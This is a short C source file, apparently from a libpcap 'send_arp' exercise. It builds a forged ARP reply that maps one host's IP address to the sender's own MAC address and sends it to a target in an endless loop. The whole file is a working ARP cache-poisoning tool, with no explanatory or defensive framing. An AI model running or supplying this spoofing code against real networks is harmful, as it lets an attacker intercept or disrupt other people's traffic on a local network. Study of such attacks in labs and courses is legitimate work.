#include "send_arp.h"

void send_arp(pcap_t *handle, struct network_pack *net1, struct network_pack *net2, struct network_pack *net3)
{
	struct ether_header ether;
	struct ether_arp arp;
	u_char packet[sizeof(struct ether_header) + sizeof(struct ether_arp)];

	ether.ether_type = htons(ETHERTYPE_ARP); 

	memcpy(ether.ether_dhost, &net3->mac, ETHER_ADDR_LEN);

	memcpy(ether.ether_shost, &net1->mac, ETHER_ADDR_LEN);

	arp.arp_hrd = htons(ARPHRD_ETHER);
	arp.arp_pro = htons(ETHERTYPE_IP);
	arp.arp_hln = ETHER_ADDR_LEN;
	arp.arp_pln = sizeof(struct in_addr);
	arp.arp_op = htons(ARPOP_REPLY);
	memcpy(&arp.arp_sha, &net1->mac, ETHER_ADDR_LEN);
	
	memcpy(&arp.arp_spa, &net2->ip, sizeof(struct in_addr));
	memcpy(&arp.arp_tha, &net3->mac, ETHER_ADDR_LEN);
	memcpy(&arp.arp_tpa, &net3->ip, sizeof(struct in_addr));

	memcpy(packet, &ether, sizeof(struct ether_header));
	memcpy(packet+sizeof(struct ether_header), &arp, sizeof(struct ether_arp));
    
    while(1) 
    {
    	if(pcap_sendpacket(handle, packet, sizeof(packet)) == -1)
    	{
    		printf("error\n");
    		continue;
    	}
    }
}